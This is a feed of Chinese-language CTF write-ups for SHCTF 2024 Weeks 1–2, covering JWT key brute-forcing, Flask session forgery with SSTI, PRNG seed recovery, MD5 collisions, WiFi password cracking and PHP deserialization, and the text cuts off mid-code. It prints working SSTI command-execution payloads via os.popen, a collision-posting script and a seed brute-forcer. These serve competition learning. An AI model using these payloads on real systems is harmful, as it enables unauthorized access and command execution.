class="headerlink" title="[Week2]登录验证"></a>[Week2]登录验证</h4><blockquote><p>考点：jwt密钥爆破</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019094834915.png" alt="image-20241019094834915"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019094844778.png" alt="image-20241019094844778"></p><blockquote><p>爆破密码，是admin</p><p>抓包查看,发现有token</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019143840061.png" alt="image-20241019143840061"></p><blockquote><p>进行jwt密钥爆破，得到密钥为222333</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241019143930858.png" alt="image-20241019143930858"></p><blockquote><p>使用密钥加密，把role改成admin，然后替换token发包就能拿到flag</p></blockquote><h4 id="Week2-入侵者禁入"><a href="#Week2-入侵者禁入" class="headerlink" title="[Week2]入侵者禁入"></a>[Week2]入侵者禁入</h4><blockquote><p>考点：session伪造+SSTI模板注入</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241020151519980.png" alt="image-20241020151519980"></p><blockquote><p>分析这段代码，知道Flask的secret.key，想到Flask_session伪造</p><p>render_template_string()函数想到SSTI漏洞。</p><p>使用flask_session_cookie_manager工具构造payload</p></blockquote><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">python flask_session_cookie_manager3.py decode -c &quot;eyJyb2xlIjp7ImZsYWciOiJ5b3VyX2ZsYWdfaGVyZSIsImlzX2FkbWluIjowfX0.ZvZ8IQ.B9Q1a7gFQvzs4Q3bGldXuiGHULg&quot; -s &quot;0day_joker&quot;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">python flask_session_cookie_manager3.py encode -s &quot;0day_joker&quot; -t &quot;&#123;&#x27;role&#x27;: &#123;&#x27;flag&#x27;: &#x27;</span><span class="template-variable">&#123;&#123;<span class="name">lipsum.globals</span>[&quot;os&quot;].popen(<span class="name">&quot;ls&quot;</span>).read()&#125;&#125;</span><span class="language-xml">&#x27;, &#x27;is_admin&#x27;: 1&#125;&#125;&quot;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">python flask_session_cookie_manager3.py encode -s &quot;0day_joker&quot; -t &quot;&#123;&#x27;role&#x27;: &#123;&#x27;flag&#x27;: &#x27;</span><span class="template-variable">&#123;&#123;<span class="name">lipsum.globals</span>[&quot;os&quot;].popen(<span class="name">&quot;ls /&quot;</span>).read()&#125;&#125;</span><span class="language-xml">&#x27;, &#x27;is_admin&#x27;: 1&#125;&#125;&quot;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">python flask_session_cookie_manager3.py encode -s &quot;0day_joker&quot; -t &quot;&#123;&#x27;role&#x27;: &#123;&#x27;flag&#x27;: &#x27;</span><span class="template-variable">&#123;&#123;<span class="name">lipsum.globals</span>[&quot;os&quot;].popen(<span class="name">&quot;cat /flag&quot;</span>).read()&#125;&#125;</span><span class="language-xml">&#x27;, &#x27;is_admin&#x27;: 1&#125;&#125;&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>修改session就能拿到flag。</p></blockquote><h4 id="Week2-guess-the-number"><a href="#Week2-guess-the-number" class="headerlink" title="[Week2]guess_the_number"></a>[Week2]guess_the_number</h4><blockquote><p>考点：随机数</p><p>在伪随机数生成器（PRNG）中，一个种子并不只生成一个随机数。相反，它生成的是一个伪随机数序列。每次调用 <code>random.randint()</code> 或其他类似方法时，伪随机数生成器会根据当前的内部状态生成下一个随机数。因此，给定相同的种子，可以生成一系列相同的随机数</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241020153007442.png" alt="image-20241020153007442"></p><blockquote><p>访问 /s0urce下载源码</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, send_file</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, first_num = first_num)  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/s0urce&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_source</span>():</span><br><span class="line">    file_path = <span class="string">&quot;app.py&quot;</span></span><br><span class="line">    <span class="keyword">return</span> send_file(file_path, as_attachment=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/first&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_first_number</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(first_num)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/guess&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_seed</span>():</span><br><span class="line">    num = request.args.get(<span class="string">&#x27;num&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> num == <span class="built_in">str</span>(second_num):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            <span class="keyword">return</span> file.read()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    <span class="keyword">global</span> seed, first_num, second_num</span><br><span class="line">    seed = random.randint(<span class="number">1000000</span>,<span class="number">9999999</span>)</span><br><span class="line">    random.seed(seed)</span><br><span class="line">    first_num = random.randint(<span class="number">1000000000</span>,<span class="number">9999999999</span>)</span><br><span class="line">    second_num = random.randint(<span class="number">1000000000</span>,<span class="number">9999999999</span>)</span><br><span class="line"></span><br><span class="line">init()</span><br><span class="line">app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><blockquote><p>分析可知，生成一个随机数，让我们预测下一个随机数。</p></blockquote><p><strong>在伪随机数生成器（PRNG）中，一个种子并不只生成一个随机数。相反，它生成的是一个伪随机数序列。每次调用 <code>random.randint()</code> 或其他类似方法时，伪随机数生成器会根据当前的内部状态生成下一个随机数。因此，给定相同的种子，可以生成一系列相同的随机数</strong></p><blockquote><p>所以可以使用脚本找到种子，然后就能预测下一个随机数</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的 first_num</span></span><br><span class="line">known_first_num = <span class="number">6296819177</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义种子的范围</span></span><br><span class="line">seed_min = <span class="number">1000000</span></span><br><span class="line">seed_max = <span class="number">9999999</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_seed</span>(<span class="params">known_first_num, seed_min, seed_max</span>):</span><br><span class="line">    <span class="keyword">for</span> seed <span class="keyword">in</span> <span class="built_in">range</span>(seed_min, seed_max + <span class="number">1</span>):</span><br><span class="line">        <span class="comment"># 用当前种子设置随机数生成器</span></span><br><span class="line">        random.seed(seed)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 生成一个随机数</span></span><br><span class="line">        first_num = random.randint(<span class="number">1000000000</span>, <span class="number">9999999999</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查生成的随机数是否与已知的相同</span></span><br><span class="line">        <span class="keyword">if</span> first_num == known_first_num:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;找到了种子: <span class="subst">&#123;seed&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> seed</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未找到匹配的种子&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数查找种子</span></span><br><span class="line">found_seed = find_seed(known_first_num, seed_min, seed_max)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241020154220638.png" alt="image-20241020154220638"></p><blockquote><p>根据找到的种子找出下一个随机数</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241020153812776.png" alt="image-20241020153812776"></p><blockquote><p>输入拿到flag</p><p>SHCTF{th1s_Num8eR_is_EaSy_Gu3Ss_29c737b0d2ae}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SHCTF 2024 week1 wp</title>
      <link href="/posts/d49b7347.html"/>
      <url>/posts/d49b7347.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="SHCTF-2024-week1-wp"><a href="#SHCTF-2024-week1-wp" class="headerlink" title="SHCTF 2024 week1 wp"></a>SHCTF 2024 week1 wp</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h4 id="Week1-真真假假-遮遮掩掩"><a href="#Week1-真真假假-遮遮掩掩" class="headerlink" title="[Week1]真真假假?遮遮掩掩!"></a>[Week1]真真假假?遮遮掩掩!</h4><blockquote><p>考点：压缩包伪加密，掩码爆破</p><p>下载附件有一个压缩包，打开发现需要密码，放进010查看</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013141600023.png" alt="image-20241013141600023"></p><blockquote><p>伪加密，直接修改</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013141917529.png" alt="image-20241013141917529"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013142232902.png" alt="image-20241013142232902"></p><blockquote><p>根据提示，想到是掩码爆破</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013142333945.png" alt="image-20241013142333945"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013142450917.png" alt="image-20241013142450917"></p><blockquote><p>SHCTF{C0ngr@tu1at1ons_On_Mast3r1ng_mAsk_aTT@ck5!}</p></blockquote><h4 id="Week1-拜师之旅①"><a href="#Week1-拜师之旅①" class="headerlink" title="[Week1]拜师之旅①"></a>[Week1]拜师之旅①</h4><blockquote><p>考点：损坏文件，png隐写</p><p>下载压缩包解压，有个损坏的图片，放进010查看</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013143047137.png" alt="image-20241013143047137"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013143303185.png" alt="image-20241013143303185"></p><blockquote><p>缺少png文件头部，补上复原</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013143555983.png" alt="image-20241013143555983"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013143544675.png" alt="image-20241013143544675"></p><blockquote><p>修改高度，得到flag</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013143704633.png" alt="image-20241013143704633"></p><h4 id="Week1-Rasterizing-Traffic"><a href="#Week1-Rasterizing-Traffic" class="headerlink" title="[Week1]Rasterizing Traffic"></a>[Week1]Rasterizing Traffic</h4><blockquote><p>考点：流量分析，光栅图解析</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013144705416.png" alt="image-20241013144705416"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013144858845.png" alt="image-20241013144858845"></p><p>经过分析，发现png图片，直接查看或导出来（显示分组字节或导出分组字节流）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013145053272.png" alt="image-20241013145053272"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013145146704.png" alt="image-20241013145146704"></p><blockquote><p>光栅图，使用工具<a href="https://github.com/AabyssZG/Raster-Terminator">AabyssZG/Raster-Terminator: CTF之光栅图秒杀器 (github.com)</a></p><p>下载下来后需要将第75行的三维数组改为二维，这题才能用</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3427126-20241009075341628-713750445.png" alt="img"></p><blockquote><p>输入命令 python Raster-Terminator.py -x 1.png</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013144509352.png" alt="image-20241013144509352"></p><blockquote><p>得到光栅图，连在一起就是flag。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013144543461.png" alt="image-20241013144543461"></p><h4 id="Week1-有WiFi干嘛不用呢？"><a href="#Week1-有WiFi干嘛不用呢？" class="headerlink" title="[Week1]有WiFi干嘛不用呢？"></a>[Week1]有WiFi干嘛不用呢？</h4><blockquote><p>考点：wifi密码爆破</p><p>用脚本将may文件夹的数据提取出来</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> ./* &gt; test.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013150141334.png" alt="image-20241013150141334"></p><blockquote><p>删除[]，用aircrack-ng爆破</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013150439262.png" alt="image-20241013150439262"></p><blockquote><p>找到wifi密码</p><p>SHCTF{0TUMVxz0JrUSDxHG}</p></blockquote><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="Week1-单身十八年的手速"><a href="#Week1-单身十八年的手速" class="headerlink" title="[Week1] 单身十八年的手速"></a>[Week1] 单身十八年的手速</h4><blockquote><p>考点：查看源代码</p><p>打开网页</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013142707618.png" alt="image-20241013142707618"></p><blockquote><p>查看源代码，找到.js文件</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013142800638.png" alt="image-20241013142800638"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013142816921.png" alt="image-20241013142816921"></p><blockquote><p>发现一串base64字符</p></blockquote><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U<span class="number">0</span>hDVEZ<span class="number">7</span>OWY<span class="number">0</span><span class="symbol">NTM2</span><span class="symbol">NzItNTJlNS00</span><span class="symbol">N2</span><span class="symbol">NlLTg4</span>OWEtMDEyYzkwMDczYmUxfQo=</span><br></pre></td></tr></table></figure><blockquote><p>解码得到flag</p><p>SHCTF{9f453672-52e5-47ce-889a-012c90073be1}</p></blockquote><h4 id="Week1-MD5-Master"><a href="#Week1-MD5-Master" class="headerlink" title="[Week1] MD5 Master"></a>[Week1] MD5 Master</h4><blockquote><p>考点：md5碰撞，md5长度拓展攻击</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"><span class="variable">$master</span> = <span class="string">&quot;MD5 master!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;master1&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;master2&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master1&quot;</span>] !== <span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master2&quot;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master1&quot;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master2&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$master</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;master? &lt;br&gt;&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>需要找到前缀都是$master但不相同，而他们的md5值又相同的值。</p><p>先用fastcoll找出这两个值。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013154012749.png" alt="image-20241013154012749"></p><blockquote><p>使用脚本post上传，得到flag。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013154120766.png" alt="image-20241013154120766"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_binary_file_as_hex</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> binary_file:</span><br><span class="line">        binary_data = binary_file.read()</span><br><span class="line">        hex_data = binascii.hexlify(binary_data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> hex_data</span><br><span class="line"> </span><br><span class="line">file_1 = <span class="string">&#x27;C:\\CTF\\WEB\\WEB\\webtools\\fastcoll.exe\\1.bin&#x27;</span></span><br><span class="line">file_2 = <span class="string">&#x27;C:\\CTF\\WEB\\WEB\\webtools\\fastcoll.exe\\2.bin&#x27;</span></span><br><span class="line">hex_data_1 = read_binary_file_as_hex(file_1)</span><br><span class="line">hex_data_1 = hex_data_1[<span class="number">22</span>:]</span><br><span class="line">hex_data_2 = read_binary_file_as_hex(file_2)</span><br><span class="line">hex_data_2 = hex_data_2[<span class="number">22</span>:]</span><br><span class="line"><span class="built_in">print</span>(hex_data_1)</span><br><span class="line"><span class="built_in">print</span>(hex_data_2)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(hex_data_1))</span><br><span class="line"> </span><br><span class="line">binary_data_1 = <span class="built_in">bytes</span>.fromhex(hex_data_1)</span><br><span class="line">binary_data_2 = <span class="built_in">bytes</span>.fromhex(hex_data_2)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">url = <span class="string">&#x27;http://210.44.150.15:25738/&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;master1&#x27;</span>: binary_data_1,</span><br><span class="line">    <span class="string">&#x27;master2&#x27;</span>: binary_data_2</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(response.status_code)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><blockquote><p>SHCTF{e0b338e9-b826-462b-af82-efce41ef53e9}</p></blockquote><h4 id="Week1-ez-gittt"><a href="#Week1-ez-gittt" class="headerlink" title="[Week1] ez_gittt"></a>[Week1] ez_gittt</h4><blockquote><p>考点：git泄露</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013162613667.png" alt="image-20241013162613667"></p><blockquote><p>查看源码，明确git泄露</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013162650245.png" alt="image-20241013162650245"></p><blockquote><p>拉取git到本地查看</p></blockquote><p><strong><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013162726079.png" alt="image-20241013162726079"></strong></p><blockquote><p>看到增加flag，查看详情，找到flag。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013162812675.png" alt="image-20241013162812675"></p><blockquote><p>SHCTF{6ad1f777-d0cf-41c1-8197-7feb7641e165}</p></blockquote><h4 id="Week1-jvav"><a href="#Week1-jvav" class="headerlink" title="[Week1] jvav"></a>[Week1] jvav</h4><blockquote><p>考点：java</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241013163210821.png" alt="image-20241013163210821"></p><blockquote><p>不懂 java，但是 gpt 会帮我写代码：</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;/flag&quot;</span>;  <span class="comment">// 本地文件路径</span></span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            reader = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(filePath));</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(line);  <span class="comment">// 输出每一行内容</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;文件读取错误: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (reader != <span class="literal">null</span>) &#123;</span><br><span class="line">                    reader.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;关闭文件时出错: &quot;</span> + e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>得到flag</p><p>SHCTF{055ac047-4421-4f0d-902a-8d4f72a585ad}</p></blockquote><h4 id="Week1-poppopop"><a href="#Week1-poppopop" class="headerlink" title="[Week1] poppopop"></a>[Week1] poppopop</h4><blockquote><p>考点:序列化反序列化</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SH</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$Web</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$SHCTF</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;p)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">T</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$n</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        SH::<span class="variable">$Web</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$o</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span 